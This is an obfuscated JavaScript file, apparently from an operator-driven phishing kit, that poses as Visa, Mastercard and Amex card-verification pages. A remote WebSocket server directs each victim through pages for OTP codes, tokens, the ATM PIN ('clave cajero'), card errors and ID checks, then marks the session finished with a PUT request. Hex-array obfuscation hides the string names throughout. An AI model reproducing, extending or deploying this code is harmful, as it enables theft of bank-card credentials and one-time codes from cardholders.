const _0x7284da = _0x4846;
(function (_0x1ba200, _0x51dd3f) {
  const _0x442045 = _0x4846,
    _0x3ce50f = _0x1ba200();
  while (!![]) {
    try {
      const _0x3db0f4 =
        (-parseInt(_0x442045(0xbf)) / 0x1) * (parseInt(_0x442045(0xcb)) / 0x2) +
        parseInt(_0x442045(0xd6)) / 0x3 +
        parseInt(_0x442045(0xc4)) / 0x4 +
        -parseInt(_0x442045(0xcc)) / 0x5 +
        parseInt(_0x442045(0xb6)) / 0x6 +
        (-parseInt(_0x442045(0xd7)) / 0x7) *
          (-parseInt(_0x442045(0xd3)) / 0x8) +
        -parseInt(_0x442045(0xd8)) / 0x9;
      if (_0x3db0f4 === _0x51dd3f) break;
      else _0x3ce50f["push"](_0x3ce50f["shift"]());
    } catch (_0x1ef7c6) {
      _0x3ce50f["push"](_0x3ce50f["shift"]());
    }
  }
})(_0xb320, 0xd905f);
function _0x4846(_0x218d7e, _0x37339b) {
  const _0xb3202e = _0xb320();
  return (
    (_0x4846 = function (_0x48463f, _0x1ba78a) {
      _0x48463f = _0x48463f - 0xa9;
      let _0x730e56 = _0xb3202e[_0x48463f];
      return _0x730e56;
    }),
    _0x4846(_0x218d7e, _0x37339b)
  );
}
const dataLogId = localStorage[_0x7284da(0xb2)](_0x7284da(0xb3)),
  token = localStorage[_0x7284da(0xb2)](_0x7284da(0xdb));
(!dataLogId || !token) &&
  (console[_0x7284da(0xce)](_0x7284da(0xc9)),
  alert(_0x7284da(0xd5)),
  (window[_0x7284da(0xbc)][_0x7284da(0xd2)] = _0x7284da(0xdc)));
const socket = io(url, { query: { token: token } });
socket["on"](_0x7284da(0xbb), () =>
  console[_0x7284da(0xb9)]("Conectado\x20al\x20WebSocket")
),
  socket["on"]("connect_error", (_0x33011b) =>
    console[_0x7284da(0xce)](_0x7284da(0xd0), _0x33011b[_0x7284da(0xc5)])
  ),
  socket["on"](_0x7284da(0xb4), async (_0x517e3e) => {
    const _0x4dd0af = _0x7284da;
    console["log"](_0x4dd0af(0xb5), _0x517e3e),
      console[_0x4dd0af(0xb9)](_0x4dd0af(0xc0), dataLogId);
    if (String(_0x517e3e[_0x4dd0af(0xaa)]) !== String(dataLogId)) return;
    const _0x41e0d8 = {
      din: _0x4dd0af(0xda),
      new_din: _0x4dd0af(0xcd),
      us: _0x4dd0af(0xcf),
      token: _0x4dd0af(0xae),
      new_token: _0x4dd0af(0xc1),
      caj: _0x4dd0af(0xc3),
      ccajeror: "error.clave.cajero.html",
      error: _0x4dd0af(0xad),
      end: "../../index2.html",
    };
    if (_0x517e3e[_0x4dd0af(0xab)] in _0x41e0d8) {
      if (_0x517e3e[_0x4dd0af(0xab)] === "end")
        try {
          await updateStatus();
        } catch (_0x2ccac3) {
          console["error"](_0x4dd0af(0xa9), _0x2ccac3),
            alert(
              "Hubo\x20un\x20error\x20al\x20actualizar\x20el\x20estado.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo."
            );
          return;
        }
      window[_0x4dd0af(0xbc)][_0x4dd0af(0xd2)] =
        _0x41e0d8[_0x517e3e[_0x4dd0af(0xab)]];
    }
  });
function _0xb320() {
  const _0x49956c = [
    "margin-bottom:\x2040px",
    "href",
    "2158408pnWgEZ",
    "origin",
    "Hubo\x20un\x20error\x20al\x20cargar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "3119922laakPI",
    "14xPhVkY",
    "9990054TdnqYG",
    "/tableData/updateEndTableData/",
    "otp.html",
    "tableDataToken",
    "./error.html",
    "Error\x20al\x20actualizar\x20el\x20estado:",
    "valid",
    "valor",
    "setAttribute",
    "error.tarjeta.html",
    "token.html",
    "stringify",
    "400px",
    "Finalizado",
    "getItem",
    "userTableDataId",
    "data",
    "Datos\x20recibidos:",
    "10610364oQkOny",
    "Bearer\x20",
    "width",
    "log",
    "style",
    "connect",
    "location",
    "json",
    "querySelector",
    "47TuHaVW",
    "ID\x20de\x20dataLog:",
    "token.error.html",
    "PUT",
    "clavecajero.html",
    "479480dQoYrv",
    "message",
    "#company-loader",
    "checkerInfo",
    "src",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "application/json",
    "61078fIwHzh",
    "167870ZREPeI",
    "otp.error.html",
    "error",
    "id-check.error.html",
    "Error\x20de\x20conexión:",
  ];
  _0xb320 = function () {
    return _0x49956c;
  };
  return _0xb320();
}
async function updateStatus() {
  const _0x3db84e = _0x7284da;
  try {
    const _0x2d19a0 = await fetch(url + _0x3db84e(0xd9) + dataLogId, {
      method: _0x3db84e(0xc2),
      headers: {
        "Content-Type": _0x3db84e(0xca),
        Authorization: _0x3db84e(0xb7) + token,
        Origin: window[_0x3db84e(0xbc)][_0x3db84e(0xd4)],
      },
      body: JSON[_0x3db84e(0xaf)]({ status: _0x3db84e(0xb1) }),
    });
    if (!_0x2d19a0["ok"]) {
      const _0x37ae73 = await _0x2d19a0[_0x3db84e(0xbd)]();
      throw new Error(
        _0x37ae73["error"] ||
          "Error\x20en\x20el\x20PUT\x20a\x20updateEndTableData"
      );
    }
    console[_0x3db84e(0xb9)](
      "Estado\x20actualizado\x20correctamente\x20en\x20el\x20servidor."
    );
  } catch (_0x23b16c) {
    throw _0x23b16c;
  }
}
const companyLoader = document[_0x7284da(0xbe)](_0x7284da(0xc6)),
  companyLogos = {
    VISA: {
      src: "./assets/logos/visa_verified.png",
      width: "130px",
      style: _0x7284da(0xd1),
    },
    MC: { src: "./assets/logos/mc_id_check_2.jpg", width: _0x7284da(0xb0) },
    AM: { src: "./assets/logos/amex_check_1.png", width: "200px" },
  },
  companyInfo = companyLogos[info[_0x7284da(0xc7)]["company"]];
companyInfo &&
  (companyLoader[_0x7284da(0xac)](
    _0x7284da(0xc8),
    companyInfo[_0x7284da(0xc8)]
  ),
  companyLoader["setAttribute"](_0x7284da(0xb8), companyInfo[_0x7284da(0xb8)]),
  companyInfo[_0x7284da(0xba)] &&
    companyLoader["setAttribute"](
      _0x7284da(0xba),
      companyInfo[_0x7284da(0xba)]
    ));
